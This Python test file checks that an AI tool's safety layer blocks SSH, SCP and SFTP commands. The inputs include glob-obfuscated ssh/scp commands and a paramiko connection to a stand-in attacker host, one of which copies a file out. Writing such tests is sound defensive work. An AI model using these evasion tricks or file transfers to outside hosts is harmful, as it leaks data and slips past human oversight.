import subprocess
import pytest
from core.inference.tools import _find_blocked_commands, _check_code_safety
from core.inference.ssh_policy import check_ssh_command_access
from state.ssh_approvals import approve_hosts, reset_ssh_approvals

@pytest.mark.parametrize("command", ["/usr/bin/ss[h] -F none user@evil.example", "env /usr/bin/s[c]p -F none file evil.example:/file"])
def test_globbed_ssh_is_blocked(command):
    assert _find_blocked_commands(command)

def test_annotated_client_requires_approval():
    code = 'import paramiko; client: paramiko.SSHClient = paramiko.SSHClient(); client.connect(hostname="evil.example")'
    assert _check_code_safety(code, session_id="round2") is not None

@pytest.mark.parametrize("command", ["ssh approved.example", "scp file approved.example:/file", "sftp approved.example"])
def test_default_configuration_is_rejected(command):
    approve_hosts("round2", ["approved.example"])
    assert check_ssh_command_access(command, "round2") is not None
